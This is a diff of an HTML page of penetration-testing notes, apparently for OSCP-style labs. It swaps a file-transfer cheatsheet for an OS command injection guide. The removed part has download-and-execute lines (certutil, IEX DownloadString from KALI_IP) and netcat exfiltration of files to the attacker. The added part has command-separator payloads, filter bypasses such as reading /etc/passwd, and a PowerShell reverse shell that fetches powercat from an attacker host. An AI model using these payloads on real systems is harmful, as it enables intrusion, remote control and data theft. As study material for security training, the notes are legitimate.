@@ -3,12 +3,13 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>File Transfer - OSCP Notes</title>
+    <title>Web Fuzzing - AD Notes</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
+    <!-- NAVBAR -->
     <nav>
         <a href="index.html">Home</a>
 
@@ -65,226 +66,181 @@
         <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
         <div id="search-results" class="search-results collapsed"></div>
     </div>
+    <!-- CONTENT -->
     <div class="container">
 
-        <h1>File Transfer Cheatsheet (Kali ↔ Windows / Linux)</h1>
-
+        <!-- CONCEPT -->
         <div class="section">
-            <div class="section-header">1. Kali → Windows (HTTP Method)</div>
+            <div class="section-header">Concept</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
+                <p>OS Command Injection occurs when a web application executes system commands using unsanitized user
+                    input.</p>
 
-                <pre><code>python3 -m http.server 80</code></pre>
+                <p>Example vulnerable pattern:</p>
 
-                <p><strong>On Windows:</strong></p>
+                <pre><code>system("git clone " + user_input);</code></pre>
 
-                <pre><code>certutil -urlcache -split -f http://KALI_IP/file.exe file.exe</code></pre>
-
-                <pre><code>iwr http://KALI_IP/file.exe -OutFile file.exe</code></pre>
-
-                <pre><code>powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','file.exe')"</code></pre>
+                <p>If input is not properly sanitized, attackers can inject additional commands.</p>
 
             </div>
         </div>
 
+        <!-- DETECTION -->
         <div class="section">
-            <div class="section-header">2. Kali → Windows (SMB Method)</div>
+            <div class="section-header">Detection</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
+                <h3>Basic tests</h3>
+                <ul>
+                    <li>Inject simple commands:</li>
+                </ul>
 
-                <pre><code>impacket-smbserver share . -smb2support -username kali -password kali</code></pre>
+                <pre><code>id
+whoami
+hostname</code></pre>
 
-                <p><strong>On Windows:</strong></p>
+                <h3>Using curl (POST example)</h3>
+                <pre><code>curl -X POST --data 'param=id' http://target/endpoint</code></pre>
 
-                <pre><code>net use \\KALI_IP\share /user:kali kali
-copy file.exe \\KALI_IP\share\</code></pre>
-
-                Or download from share:
-
-                <pre><code>copy \\KALI_IP\share\file.exe file.exe</code></pre>
+                <p>If output changes or system responses appear → possible injection.</p>
 
             </div>
         </div>
 
+        <!-- ENUMERATION -->
         <div class="section">
-            <div class="section-header">3. Windows → Kali (Netcat Method)</div>
+            <div class="section-header">Enumeration</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
+                <h3>Identify OS</h3>
+                <pre><code>git version
+ver</code></pre>
 
-                <pre><code>nc -lvnp 9001 > file.exe</code></pre>
+                <h3>Check execution environment</h3>
+                <pre><code>(dir 2>&1 *`|echo CMD);&lt;# rem #&gt;echo PowerShell</code></pre>
 
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.exe</code></pre>
-
-                If no nc on Windows:
-
-                <pre><code>type file.exe | nc KALI_IP 9001</code></pre>
+                <p>Determines if commands are executed in CMD or PowerShell.</p>
 
             </div>
         </div>
 
+        <!-- INJECTION TECHNIQUES -->
         <div class="section">
-            <div class="section-header">4. Kali → Linux (HTTP Method)</div>
+            <div class="section-header">Injection Techniques</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
+                <h3>Command separators</h3>
+                <pre><code>; ls
+&& whoami
+| id
+& dir</code></pre>
 
-                <pre><code>python3 -m http.server 80</code></pre>
+                <h3>URL encoded separators</h3>
+                <pre><code>%3B → ;
+%26%26 → &&
+%7C → |</code></pre>
 
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>wget http://KALI_IP/file.sh
-curl http://KALI_IP/file.sh -o file.sh</code></pre>
+                <h3>Example injection</h3>
+                <pre><code>git;ipconfig</code></pre>
 
             </div>
         </div>
 
+        <!-- BYPASS TECHNIQUES -->
         <div class="section">
-            <div class="section-header">5. Linux → Kali (Netcat Method)</div>
+            <div class="section-header">Bypass Techniques</div>
             <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
+                <h3>Encoding</h3>
+                <pre><code>git%3Bipconfig</code></pre>
 
-                <pre><code>nc -lvnp 9001 > file.txt</code></pre>
+                <h3>Whitespace bypass</h3>
+                <pre><code>cat${IFS}/etc/passwd</code></pre>
 
-                <p><strong>On Linux victim:</strong></p>
+                <h3>Quotes bypass</h3>
+                <pre><code>echo "test"
+echo test</code></pre>
 
-                <pre><code>nc KALI_IP 9001 &lt; file.txt</code></pre>
+                <h3>Obfuscation</h3>
+                <pre><code>$(whoami)
+`id`</code></pre>
 
             </div>
         </div>
 
+        <!-- EXPLOITATION -->
         <div class="section">
-            <div class="section-header">6. SCP (If SSH Available)</div>
+            <div class="section-header">Exploitation</div>
             <div class="section-content">
 
-                <p><strong>From Kali to Linux:</strong></p>
+                <h3>Step 1 – Inject command</h3>
+                <pre><code>Archive=git;whoami</code></pre>
 
-                <pre><code>scp file user@TARGET_IP:/tmp/</code></pre>
+                <h3>Step 2 – Enumerate system</h3>
+                <pre><code>Archive=git;hostname
+Archive=git;ipconfig
+Archive=git;ifconfig</code></pre>
 
-                <p><strong>From Linux to Kali:</strong></p>
-
-                <pre><code>scp user@TARGET_IP:/tmp/file .</code></pre>
+                <h3>Step 3 – File system access</h3>
+                <pre><code>Archive=git;dir
+Archive=git;ls -la</code></pre>
 
             </div>
         </div>
 
+        <!-- REVERSE SHELL -->
         <div class="section">
-            <div class="section-header">7. Base64 Transfer (When Nothing Works)</div>
+            <div class="section-header">Reverse Shell</div>
             <div class="section-content">
 
-                <p><strong>On victim:</strong></p>
+                <h3>PowerShell reverse shell (Windows)</h3>
+                <pre><code>IEX (New-Object System.Net.Webclient).DownloadString("http://attacker/powercat.ps1");powercat -c ATTACKER_IP -p 4444 -e powershell</code></pre>
 
-                <pre><code>base64 file.exe</code></pre>
+                <h3>Netcat listener</h3>
+                <pre><code>nc -nvlp 4444</code></pre>
 
-                Copy output manually.
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe</code></pre>
+                <h3>Alternative simple PowerShell shell</h3>
+                <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."</code></pre>
 
             </div>
         </div>
 
+        <!-- OS / ENV DETECTION -->
         <div class="section">
-            <div class="section-header">8. PowerShell Encoded Download</div>
+            <div class="section-header">OS / Environment Detection</div>
             <div class="section-content">
 
-                <pre><code>powershell -enc BASE64COMMAND</code></pre>
+                <h3>Windows</h3>
+                <pre><code>ipconfig
+ver</code></pre>
 
-                Generate encoded command:
-
-                <pre><code>echo -n "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0</code></pre>
+                <h3>Linux</h3>
+                <pre><code>ifconfig
+uname -a</code></pre>
 
             </div>
         </div>
 
+        <!-- NOTES -->
         <div class="section">
-            <div class="section-header">9. FTP Quick Method</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>sudo python3 -m pyftpdlib -p 21</code></pre>
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>ftp KALI_IP</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">10. OSCP Mental Quick Picks</div>
+            <div class="section-header">Notes</div>
             <div class="section-content">
 
                 <ul>
-                    <li>Have PowerShell? → iwr</li>
-                    <li>No PowerShell? → certutil</li>
-                    <li>Linux? → wget</li>
-                    <li>No tools? → base64</li>
-                    <li>Need exfiltration? → netcat</li>
-                    <li>SMB open? → impacket-smbserver</li>
+                    <li>Filters often block common separators or keywords</li>
+                    <li>Encoding and obfuscation are key bypass techniques</li>
+                    <li>Execution context (CMD vs PowerShell vs Bash) matters</li>
+                    <li>Always test command concatenation behavior</li>
+                    <li>Reverse shells depend on outbound connectivity</li>
                 </ul>
 
             </div>
         </div>
-        <div class="section">
-            <div class="section-header">11. Transfer Through Pivot (Ligolo / Tunnel)</div>
-            <div class="section-content">
 
-                <p>Cuando estás dentro de una red interna, NO puedes usar directamente tu IP de Kali.</p>
-
-                <p><strong>Solución:</strong> usar el túnel (ej: Ligolo)</p>
-
-                <p><strong>Ejemplo:</strong> descargar desde Kali a máquina interna</p>
-
-                <pre><code>wget http://ATTACKER_TUN_IP/file.sh
-</code></pre>
-
-                <p>Tu IP será algo como:</p>
-
-                <pre><code>10.10.0.1 (interfaz ligolo)</code></pre>
-
-                <p><strong>Servidor en Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80 --bind 0.0.0.0
-</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">12. Transfer Without Tools (Echo / Chunking)</div>
-            <div class="section-content">
-
-                <p>Cuando NO hay wget, curl, nc...</p>
-
-                <p><strong>En Kali:</strong></p>
-
-                <pre><code>base64 file.exe > file.b64
-</code></pre>
-
-                <p><strong>En víctima:</strong></p>
-
-                <pre><code>echo BASE64_PART >> file.b64
-</code></pre>
-
-                <p>Repetir por partes.</p>
-
-                <p><strong>Decodificar:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe
-</code></pre>
-
-            </div>
-        </div>
     </div>
 
+    <!-- SCRIPT -->
     <script>
         document.querySelectorAll(".section-header").forEach(h => {
             h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
